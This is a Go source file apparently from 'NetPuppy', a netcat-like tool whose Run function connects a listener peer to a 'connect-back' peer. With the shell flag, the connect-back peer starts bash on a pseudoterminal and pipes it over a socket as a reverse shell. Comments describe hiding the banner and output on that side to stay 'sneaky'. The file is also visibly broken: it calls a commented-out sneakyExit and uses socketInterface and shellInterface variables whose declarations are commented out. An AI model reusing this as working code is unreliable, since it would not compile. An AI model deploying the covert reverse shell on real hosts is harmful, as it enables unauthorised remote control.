package cmd

import (
	"context"
	"errors"
	"fmt"
	"io"
	"os"
	"os/signal"
	"syscall"

	// NetPuppy pkgs:
	"github.com/trshpuppy/netpuppy/cmd/conn"
	"github.com/trshpuppy/netpuppy/cmd/hosts"
	"github.com/trshpuppy/netpuppy/cmd/shell"
	"github.com/trshpuppy/netpuppy/pkg/ioctl"
	"github.com/trshpuppy/netpuppy/pkg/pty"
	"github.com/trshpuppy/netpuppy/utils"
)

// WRITECOOTER STAYS!!!!! TO COMMEMORATE THE DUMBEST BUG I'VE EVER PERSONALLY ENCOUNTERED!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
type WriteCooter struct {
	Writer io.Writer
	Count  uint64
}

func (wc *WriteCooter) Write(dataInPipe []byte) (int, error) {
	bytesSent, err := wc.Writer.Write(dataInPipe)
	wc.Count += uint64(bytesSent)

	return bytesSent, err
}

type ReadCounter struct {
	Reader io.Reader
	Count  uint64
}

func (rc *ReadCounter) Read(dataInPipe []byte) (int, error) {
	bytesRead, err := rc.Reader.Read(dataInPipe)
	rc.Count += uint64(bytesRead)

	return bytesRead, err
}

// This struct is being used in sneakyExit() (when there is a rev shell)
// .... so we can close things (since os.Exit() doesn't run defer statements)
type Closers struct {
	socketToClose       conn.SocketInterface
	shellToClose        *shell.RealShell
	filesToClose        []*os.File
	byteChannelsToClose []chan []byte
	termiosToFix        *syscall.Termios
}

// First, make a function we can call which sends errors into the socket
// .... & handles closing files, etc. before quitting (sneaky).
// func sneakyExit(err error, closeUs Closers) {
// 	fmt.Printf("Sneaky exit error: %v\n", err.Error())
// 	// We are the rev-shell, let's limit output to stdout/err,
// 	// .... so send error through socket, then quit:
// 	socketPresent := closeUs.socketToClose != nil
// 	shellPresent := closeUs.shellToClose != nil
// 	filesPresent := len(closeUs.filesToClose) > 0
// 	byteChannelsPresent := len(closeUs.byteChannelsToClose) > 0
// 	errMsg := err.Error()

// 	// Send error, then close socket:
// 	if socketPresent {
// 		fmt.Printf("Killing Socket\n")
// 		// We could maybe send a custom signal to tell the other peer to close immediately...
// 		// .... [[instead of it continuing to try to use the socket]]
// 		closeUs.socketToClose.WriteShit([]byte(errMsg))
// 		closeUs.socketToClose.Close()
// 	}

// 	// Kill the rev-shell process:
// 	if shellPresent {
// 		fmt.Printf("Killing Shell\n")
// 		closeUs.shellToClose.Shell.Process.Release()
// 		closeUs.shellToClose.Shell.Process.Kill()
// 	}

// 	// If there are open files (in the list), close them:
// 	if filesPresent {
// 		for _, file := range closeUs.filesToClose {
// 			if file != nil {
// 				fmt.Printf("Closing %v\n", file.Name())
// 				file.Close()
// 			}
// 		}
// 	}

// 	// If tehre are open channels, close them:
// 	if byteChannelsPresent {
// 		for _, ch := range closeUs.byteChannelsToClose {
// 			fmt.Printf("Killing channel: %v\n", ch)
// 			close(ch)
// 		}
// 	}

// 	// If the termios struct is present: disable raw mode
// 	if closeUs.termiosToFix != nil {
// 		fmt.Printf("Disabling raw mode\n")
// 		ioctl.DisableRawMode(syscall.Stdin, closeUs.termiosToFix)
// 	}

// 	// K, now we can quietly die
// 	os.Exit(69)
// }

func Run(c conn.ConnectionGetter) {
	// Make a parent context for the main (Run()) routine:
	parentCtx, pCancel := context.WithCancel(context.Background())
	defer pCancel()
	fmt.Print("Here is the parent contesxt: %v\n", parentCtx)

	// Start SIGINT routine before we block Run() with child contexts:
	go func() {
		// If SIGINT: close connection, exit w/ code 2
		signalChan := make(chan os.Signal, 1)
		signal.Notify(signalChan, os.Interrupt)
		defer signal.Stop(signalChan)

		<-signalChan
		pCancel()
	}()

	// Parse flags from user, attach to struct:
	flagStruct := utils.GetFlags()
	var closeUs Closers

	// Create peer instance based on user input:
	var thisPeer *conn.Peer = conn.CreatePeer(flagStruct.Port, flagStruct.Host, flagStruct.Listen, flagStruct.Shell)

	// Print banner, but don't print if we are the peer running the shell (ooh sneaky!):
	if !thisPeer.Shell {
		fmt.Printf("%s", utils.Banner())

		// Update user:
		var updateUserBanner string = utils.UserSelectionBanner(thisPeer.ConnectionType, thisPeer.Address, thisPeer.RPort, thisPeer.LPort)
		fmt.Println(updateUserBanner)
	}

	// Make the Host type based on the peer struct:
	var host hosts.Host
	host, err := hosts.NewHost(thisPeer)
	if err != nil {
		fmt.Printf("Error trying to create new host: %v\n", err)
	}

	fmt.Printf("We made it back to exe.go, the host is: %v\n", host)

	// // Make connection:
	// var socketInterface conn.SocketInterface
	// closeUs.socketToClose = socketInterface

	// if thisPeer.ConnectionType == "offense" {
	// 	socketInterface, err = c.GetConnectionFromListener(thisPeer.LPort, thisPeer.Address)
	// } else {
	// 	socketInterface, err = c.GetConnectionFromClient(thisPeer.RPort, thisPeer.Address, thisPeer.Shell)
	// }

	// if err != nil {
	// 	sneakyExit(err, closeUs)
	// 	return
	// }
	// defer socketInterface.Close()

	// // If shell flag is true, get shell cmd (to start later)
	// var shellInterface *shell.RealShell
	// var shellErr error
	// closeUs.shellToClose = shellInterface

	// if thisPeer.Shell && thisPeer.ConnectionType == "connect-back" {
	// 	var realShellGetter shell.RealShellGetter
	// 	shellInterface, shellErr = realShellGetter.GetConnectBackInitiatedShell()

	// 	if shellErr != nil {
	// 		customErr := fmt.Errorf("Error starting the rev shell process: %v\n", shellErr)
	// 		sneakyExit(customErr, closeUs)
	// 		return
	// 	}
	// }

	// // Start SIGINT go routine & start channel to listen for SIGINT:
	// listenForSIGINT(socketInterface, thisPeer)

	// ................................................. CONNECT-BACK w/ SHELL .................................................

	// If we are the connect-back peer & the user wants a shell, start the shell here:
	if thisPeer.ConnectionType == "connect-back" && thisPeer.Shell {
		// // First, make a function we can call which sends errors into the socket
		// // .... & handles closing files, etc. before quitting (sneaky).
		// Get pts and ptm device files (for pseudoterminal):
		var master *os.File
		var pts *os.File
		closeUs.filesToClose = append(closeUs.filesToClose, master, pts)
		var err error

		master, pts, err = pty.GetPseudoterminalDevices()
		if err != nil {
			customErr := fmt.Errorf("Error setting up pseudoterminal: %v\n", err)
			sneakyExit(customErr, closeUs)
			return
		}
		defer master.Close()
		defer pts.Close()

		// Hook up slave/pts device to bash process:
		// .... (literally just point it to the file descriptors)
		shellInterface.Shell.Stdin = pts
		shellInterface.Shell.Stdout = pts
		shellInterface.Shell.Stderr = pts

		// Start bash:
		err = shellInterface.StartShell()
		if err != nil {
			// Write error to socket, close socket, quit:
			customErr := fmt.Errorf("Error starting shell: %v\n", err)
			sneakyExit(customErr, closeUs)
			return
		}
		defer shellInterface.Shell.Process.Release()
		defer shellInterface.Shell.Process.Kill()

		var routineErr error
		var errorChan1 = make(chan error)
		var errorChan2 = make(chan error)

		// Copy output from master device to socket:
		go func(socket conn.SocketInterface, master *os.File, errorChan chan<- error) {
			// Create instance of WriteCounter for io.Copy (dest arg):
			copyCounter := &WriteCooter{Writer: socket.GetWriter()}
			_, err := io.Copy(copyCounter, master)
			if err != nil {
				routineErr = fmt.Errorf("Error copying master device to socket: %v\n", err)
				errorChan <- routineErr
				// close(errorChan)
			}
		}(socketInterface, master, errorChan1)

		// Copy output from socket to master device:
		go func(socket conn.SocketInterface, master *os.File, errorChan chan<- error) {
			for {
				socketContent, puppies_on_the_storm_if_give_this_puppy_ride_sweet_netpuppy_will_die := socket.Read() // @arthvadrr 'err'
				if puppies_on_the_storm_if_give_this_puppy_ride_sweet_netpuppy_will_die != nil {
					routineErr = fmt.Errorf("ERROR: reading from socket: %v\n", puppies_on_the_storm_if_give_this_puppy_ride_sweet_netpuppy_will_die)
					errorChan <- routineErr
					// close(errorChan)
				}
				master.Write(socketContent)
			}
		}(socketInterface, master, errorChan2)

		// Case select for the two error channels. If one has an error in it, close the other and sneaky exit:
		select {
		case err1, open1 := <-errorChan1:
			if open1 {
				close(errorChan1)
			}
			close(errorChan2)
			sneakyExit(err1, closeUs)
		case err2, open2 := <-errorChan2:
			if open2 {
				close(errorChan2)
			}
			close(errorChan1)
			sneakyExit(err2, closeUs)
		}
	} else {
		// ................................................. OFFENSIVE SERVER .................................................
		// ... (or connect-back peer w/o shell flag)

		// ................................................. OG STRAT .................................................
		// ............................ This is for the listener peer;
		//								We have 4 go routines, one for reading input from the user,
		//								one for reading the socket, one for writing to the socket,
		//								and one for printing socket output to the user.
		//
		//								There are 2 channels. We use a case select block to check
		//								the channels for data. One channel has user input, the other
		//								has socket data. If there is data in either, then we call either
		//								writeToSocket() or printToUser(). If there isn't data in either,
		//								we timeout for 69 (nice) milliseconds.
		//
		//								This strat seems to run more smoothly than the io.Copy() strat below
		//								(even though it was the opposite case for the connect back peer).
		// ...........................

		// Make channels for reaading from user & socket
		// .... & defer their close until Run() returns:
		uWu := make(chan []byte) // userInputChan
		socketDataChan := make(chan []byte)
		closeUs.byteChannelsToClose = append(closeUs.byteChannelsToClose, uWu, socketDataChan)

		// Enable Raw Mode:
		var errno syscall.Errno
		var oGTermios *syscall.Termios
		closeUs.termiosToFix = oGTermios

		oGTermios, errno = ioctl.EnableRawMode(syscall.Stdin)
		if errno != 0 {
			customErr := fmt.Errorf("Error enabling termios raw mode; returned error code: %s\n,", errno)
			sneakyExit(customErr, closeUs)
			return
		}
		// Use the oGTermios structure w/ a defer of DisableRawMode() to reset the terminal before exiting:
		defer ioctl.DisableRawMode(syscall.Stdin, oGTermios)

		// Go routine to write to socket:
		writeToSocket := func(data []byte, socket conn.SocketInterface) {
			// Called from the select block (user has entered input)
			// .... Check length so we can clear channel, but not send blank data:
			_, erR := socket.WriteShit(data)
			if erR != nil {
				customErr := fmt.Errorf("Error writing user input buffer to socket: %v\n", erR)
				sneakyExit(customErr, closeUs)
				return
			}
		}

		// Go routine to read stdin byte by byte and send to uWu chan:
		readUserInput := func(uWu chan<- []byte) {
			buffer := make([]byte, 1)

			// Read Stdin in a for loop, byte by byte...
			for {
				i, TIT_BY_BOO := os.Stdin.Read(buffer)
				if TIT_BY_BOO != nil {
					if errors.Is(TIT_BY_BOO, io.EOF) {
						continue
					} else {
						customErr := fmt.Errorf("Error reading from stdin: %v\n", TIT_BY_BOO)
						sneakyExit(customErr, closeUs)
						break
					}
				}

				// go writeToSocket(buffer[:i], socketInterface)
				// Send the char down the socket
				uWu <- buffer[:i]
				//fmt.Printf("> %s\n",buffer[:i] )
			}
		}

		// Go routine to read data from socket:
		readSocket := func(socketInterface conn.SocketInterface, c chan<- []byte) {
			// For loop starts & we try to read the socket,
			// .... if there is data, we put it in the dataReadFromSocket channel.
			// .... If there is an error, we check the error type
			// .... (to handle EOF since we don't care about EOF)
			for {
				dataReadFromSocket, err := socketInterface.Read()
				if len(dataReadFromSocket) > 0 {
					c <- dataReadFromSocket
				}

				if err != nil {
					if errors.Is(err, io.EOF) {
						continue
					} else {
						customErr := fmt.Errorf("Error reading data from socket: %v\n", err)
						sneakyExit(customErr, closeUs)
						return
					}
				}
			}
		}

		// Go routine to print data from socket to user:
		printToUser := func(data []byte) {
			// Called from the select block (data has come in from the socket)
			// .... Check the length:
			_, err := os.Stdout.Write(data)
			if err != nil {
				customErr := fmt.Errorf("Error printing data to user: %v\n", err)
				sneakyExit(customErr, closeUs)
			}
		}

		// Start go routines to read from socket and user:
		go readSocket(socketInterface, socketDataChan)
		go readUserInput(uWu)

		// This for loop uses a select block to check the channels from the read routines,
		// .... if either channel has data in it, then we call the write routines
		// .... which write to the socket OR print to the user
		// .... otherwise, we timeout.
		for {
			// dataFromSocket := <-uWu
			// go printToUser(dataFromSocket)
			select {
			case dataFromUser := <-uWu:
				go writeToSocket(dataFromUser, socketInterface)
			case dataFromSocket := <-socketDataChan:
				go printToUser(dataFromSocket)
			}
		}
	}
}
